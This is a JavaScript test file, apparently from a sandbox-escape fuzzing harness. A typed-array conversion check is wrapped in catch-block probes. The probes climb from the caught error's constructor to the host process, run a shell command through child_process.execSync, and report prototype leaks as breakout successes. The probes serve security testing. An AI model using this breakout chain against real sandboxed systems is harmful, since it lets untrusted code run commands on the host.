try {
    var values = byteConversionValues.values;
    var expected = byteConversionValues.expected;
    assert(values.length > 0);
    assert.sameValue(values.length, expected.Float32.length, 'Float32');
    assert.sameValue(values.length, expected.Float64.length, 'Float64');
    assert.sameValue(values.length, expected.Int8.length, 'Int8');
    assert.sameValue(values.length, expected.Int16.length, 'Int16');
    assert.sameValue(values.length, expected.Int32.length, 'Int32');
    assert.sameValue(values.length, expected.Uint8.length, 'Uint8');
    assert.sameValue(values.length, expected.Uint16.length, 'Uint16');
    assert.sameValue(values.length, expected.Uint32.length, 'Uint32');
    assert.sameValue(values.length, expected.Uint8Clamped.length, 'Uint8Clamped');
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}